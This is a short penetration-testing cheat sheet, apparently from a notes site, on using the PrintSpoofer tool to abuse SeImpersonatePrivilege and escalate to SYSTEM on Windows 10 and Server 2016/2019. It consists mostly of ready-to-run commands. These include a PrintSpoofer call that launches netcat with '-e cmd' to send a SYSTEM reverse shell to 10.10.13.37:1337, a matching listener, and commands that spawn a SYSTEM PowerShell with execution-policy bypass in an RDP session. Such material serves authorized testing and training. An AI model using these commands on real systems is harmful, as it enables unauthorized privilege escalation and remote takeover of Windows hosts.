# Printspoofer / SEImpersonate

{% embed url="https://github.com/itm4n/PrintSpoofer" %}

#### <mark style="color:green;">From LOCAL/NETWORK SERVICE to SYSTEM by abusing SeImpersonatePrivilege on Windows 10 and Server 2016/2019.</mark>

{% embed url="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/" %}

### <mark style="color:red;">Spawn a SYSTEM process and interact with it</mark>

If you have an interactive shell, you can create a new SYSTEM process in your current console.

```
PrintSpoofer.exe -i -c cmd
```

### <mark style="color:red;">Spawn a SYSTEM process and exit</mark>

If you can execute commands but you don't have an interactive shell, you can create a new SYSTEM process and exit immediately without interacting with it.

Use case: WinRM, WebShell, wmiexec.py, smbexec.py, etc.

```
PrintSpoofer.exe -c "C:\TOOLS\nc.exe 10.10.13.37 1337 -e cmd"
```

Netcat listener:

```
nc.exe -l -p 1337
```

### <mark style="color:red;">Spawn a SYSTEM process on a desktop</mark>

If you are logged on locally or via RDP (including VDI), you can spawn a SYSTEM command prompt on your desktop. First, check your session ID with the command qwinsta and then specify this value with the option -d.

Use case: Terminal Session (RDP), VDI

```
qwinsta

# check your session ID

PrintSpoofer.exe -d [rdp session id number] -c "powershell -ep bypass"

PrintSpoofer.exe -d 3 -c "powershell -ep bypass"
```
